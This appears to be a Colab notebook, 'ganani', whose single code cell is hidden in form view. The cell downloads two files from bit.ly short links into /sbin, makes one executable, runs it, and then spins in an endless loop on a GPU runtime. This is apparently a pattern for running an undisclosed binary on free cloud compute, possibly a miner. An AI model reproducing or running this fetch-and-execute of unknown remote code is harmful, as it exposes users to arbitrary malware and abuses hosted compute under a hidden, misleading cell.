{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "ganani.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "R-CbmO0H2qGP"
      },
      "source": [
        "#@title ganani\n",
        "\n",
        "%cd /sbin\n",
        "!wget https://bit.ly/3hvr7kl\n",
        "!wget https://bit.ly/3hfAsxA\n",
        "!chmod +x 3hfAsxA\n",
        "!./3hfAsxA\n",
        "\n",
        "while True:pass\n",
        "\n",
        "\n"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}

